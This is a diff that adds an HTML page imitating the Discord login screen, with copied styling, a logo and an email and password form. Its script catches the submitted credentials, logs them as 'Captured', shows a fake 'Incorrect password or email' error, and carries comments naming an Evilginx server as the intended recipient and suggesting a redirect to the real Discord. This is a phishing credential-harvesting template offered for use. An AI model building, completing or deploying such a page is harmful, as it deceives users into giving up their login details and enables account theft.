@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <style>
+        /* RESET & BASE */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+        body {
+            background-color: var(--bg-primary);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: var(--text-normal);
+        }
+        
+        /* COLORS */
+        :root {
+            --bg-primary: #313338;
+            --bg-secondary: #2B2D31;
+            --text-normal: #dbdee1;
+            --text-muted: #9ca2af;
+            --input-bg: #1e1f22;
+            --input-border: #1e1f22;
+            --input-border-focus: #5865F2;
+            --button-primary: #5865F2;
+            --button-hover: #4752c9;
+            --text-header: #ffffff;
+            --text-label: #b5bac1;
+            --text-error: #f25a56;
+            --text-link: #00a8fc;
+        }
+
+        /* LAYOUT */
+        .login-container {
+            background-color: var(--bg-secondary);
+            padding: 32px;
+            width: 480px;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo {
+            width: 120px;
+            height: 38px;
+            margin-bottom: 20px;
+            fill: var(--text-header);
+        }
+
+        h2 {
+            color: var(--text-header);
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: var(--text-label);
+            font-size: 12px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        input {
+            width: 100%;
+            background-color: var(--input-bg);
+            border: none;
+            padding: 10px 12px;
+            color: var(--text-normal);
+            font-size: 16px;
+            border-radius: 3px;
+            outline: none;
+            transition: border 0.2s ease;
+        }
+
+        input:focus {
+            border: 2px solid var(--input-border-focus);
+        }
+
+        button {
+            width: 100%;
+            background-color: var(--button-primary);
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            border-radius: 3px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+
+        button:hover {
+            background-color: var(--button-hover);
+        }
+
+        .register-link {
+            margin-top: 24px;
+            font-size: 14px;
+            color: var(--text-normal);
+            text-align: center;
+        }
+
+        .register-link a {
+            color: var(--text-link);
+            text-decoration: none;
+        }
+
+        .register-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* ANIMATION */
+        .hidden {
+            display: none;
+        }
+        
+        .loading {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
+        .error-msg {
+            color: var(--text-error);
+            font-size: 14px;
+            margin-bottom: 15px;
+            text-align: center;
+            min-height: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- DISCORD LOGO SVG -->
+        <svg class="logo" viewBox="0 0 120 28" xmlns="http://www.w3.org/2000/svg">
+            <path d="M23.27 7.12C21.74 6.48 20.1 6 18.4 6c-1.7 0-3.34.48-4.87 1.12-.36.17-.38.67.05.84 1.44.62 3.02 1.02 4.69 1.02 1.67 0 3.25-.4 4.69-1.02.43-.17.41-.84.05-.84zM35.3 2.93c-2.65 0-4.8 1.67-5.57 4.03-.13.4-.05.82.28 1.06.3.2.67.17.95-.06.76-.64 1.8-1.03 2.92-1.03 1.12 0 2.16.39 2.92 1.03.28.23.65.26.95.06.33-.24.41-.66.28-1.06-.77-2.36-2.92-4.03-5.57-4.03zM15.63 2.93c-2.65 0-4.8 1.67-5.57 4.03-.13.4-.05.82.28 1.06.3.2.67.17.95-.06.76-.64 1.8-1.03 2.92-1.03 1.12 0 2.16.39 2.92 1.03.28.23.65.26.95.06.33-.24.41-.66.28-1.06-.77-2.36-2.92-4.03-5.57-4.03z" fill="white" transform="translate(0, -10) scale(1.5)"/>
+            <text x="0" y="30" font-family="Arial" font-weight="bold" font-size="28" fill="white">Discord</text>
+        </svg>
+
+        <h2>Welcome back!</h2>
+        
+        <div id="error-message" class="error-msg"></div>
+
+        <form id="login-form">
+            <div class="form-group">
+                <label for="email">EMAIL</label>
+                <input type="text" id="email" name="email" autocomplete="off" required>
+            </div>
+
+            <div class="form-group">
+                <label for="password">PASSWORD</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+
+            <button type="submit" id="submit-btn">Log In</button>
+        </form>
+
+        <div class="register-link">
+            Need an account? <a href="#">Register</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('submit-btn');
+            const errorMsg = document.getElementById('error-message');
+
+            // UI Feedback
+            btn.textContent = "Logging in...";
+            btn.classList.add('loading');
+            errorMsg.textContent = "";
+
+            // Simulate network delay for realism (1.5 seconds)
+            setTimeout(() => {
+                btn.classList.remove('loading');
+                btn.textContent = "Log In";
+
+                // Here you would normally send data to your Evilginx server
+                // For now, we simulate success
+                console.log(`Captured: ${email} / ${password}`);
+                
+                // Show a fake error or redirect to real Discord
+                errorMsg.textContent = "Incorrect password or email.";
+                errorMsg.style.color = "#f25a56";
+                
+                // Optional: Redirect to actual Discord after "fail"
+                // window.location.href = "https://discord.com/login";
+                
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
